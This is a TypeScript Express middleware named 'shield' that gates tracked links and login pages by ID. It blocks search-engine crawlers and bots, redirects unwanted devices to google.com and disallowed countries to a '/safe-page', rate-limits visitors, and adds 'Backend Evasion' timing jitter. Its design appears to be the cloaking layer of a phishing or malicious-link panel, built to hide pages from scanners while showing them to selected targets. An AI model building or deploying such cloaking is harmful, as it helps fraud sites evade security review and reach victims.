import { Request, Response, NextFunction } from 'express';
import { getLinkByCode, getUserByCode, getUserById } from './db';
import { GeoService } from './services/geo.service';

// Rate Limit Store (In-Memory for Phase 11)
const rateLimits = new Map<string, { count: number, reset: number }>();

export const shieldMiddleware = async (req: Request, res: Response, next: NextFunction) => {
    // Identify ID from query or path (e.g. /login?id=XYZ or /l/XYZ)
    const id = (req.query.id as string) || req.path.split('/').pop() || '';

    // Admin/API Bypass
    if (req.path.startsWith('/api/admin') || req.path.startsWith('/admin')) {
        return next();
    }

    let adminId: string | null = null;
    let linkConfig: Record<string, any> = {};

    // 1. Resolve Context (Link vs User)
    if (id) {
        const link = await getLinkByCode(id);
        if (link) {
            adminId = link.adminId;
            // Link Config takes precedence for Flow/Security.
            linkConfig = link.flow_config || {};
        } else {
            const user = await getUserByCode(id);
            if (user) {
                adminId = user.id;
            }
        }
    }

    // 2. Security Enforcement
    if (linkConfig['security']) {
        const sec = linkConfig['security'];

        // A. Bot Protection
        const ua = req.headers['user-agent'] || '';
        if (sec.blockBots) {
            const botRegex = /bot|crawl|spider|google|bing|yahoo|duckduckgo/i;
            if (botRegex.test(ua)) {
                console.log(`[Shield] Blocked Bot: ${ua}`);
                return res.status(403).send('Access Denied'); // Or fake 404
            }
        }

        // B. Device Targeting
        if (sec.deviceTarget && sec.deviceTarget !== 'all') {
            const isMobile = /mobile|android|iphone|ipad/i.test(ua);
            if (sec.deviceTarget === 'mobile' && !isMobile) {
                return res.redirect('https://google.com'); // Desktop blocked
            }
            if (sec.deviceTarget === 'desktop' && isMobile) {
                return res.redirect('https://google.com'); // Mobile blocked
            }
        }

        // C. Rate Limiting
        if (sec.rateLimit) { // e.g., 10 (requests per minute)
            const ip = GeoService.getClientIp(req);
            const key = `${id}:${ip}`;
            const state = rateLimits.get(key) || { count: 0, reset: Date.now() + 60000 };

            if (Date.now() > state.reset) {
                state.count = 0;
                state.reset = Date.now() + 60000;
            }

            state.count++;
            rateLimits.set(key, state);

            if (state.count > sec.rateLimit) {
                console.log(`[Shield] Rate Limit Exceeded for ${ip}`);
                return res.status(429).send('Too Many Requests');
            }
        }
    }

    // 3. Admin Settings Fallback (Geo)
    if (adminId) {
        const user = await getUserById(adminId);
        if (user && user.settings) {
            try {
                const settings = typeof user.settings === 'string' ? JSON.parse(user.settings) : user.settings;
                const allowed: string[] = settings.allowedCountries || [];
                const blocked: string[] = settings.blockedCountries || [];

                const ip = GeoService.getClientIp(req);
                const country = GeoService.getIpCountry(ip);

                if (blocked.length > 0 && blocked.includes(country)) {
                    console.log(`[Shield] Blocked Country ${country} for IP ${ip}`);
                    return res.redirect('/safe-page');
                }
                if (allowed.length > 0 && !allowed.includes(country)) {
                    console.log(`[Shield] Non-Allowed Country ${country} for IP ${ip}`);
                    return res.redirect('/safe-page');
                }
            } catch (e) {
                console.error('[Shield] Settings parse error', e);
            }
        }
    }

    // 4. Timing Jitter (Backend Evasion)
    // Add random 150-400ms delay to thwart timing analysis of specific user accounts
    if (req.path.startsWith('/api') && !req.path.includes('/sync')) { // Do not delay sync too much
        const jitter = Math.floor(Math.random() * 250) + 150;
        await new Promise(r => setTimeout(r, jitter));
    }

    next();
};

export const verifyHandler = (req: Request, res: Response) => {
    res.json({ status: 'ok' });
};
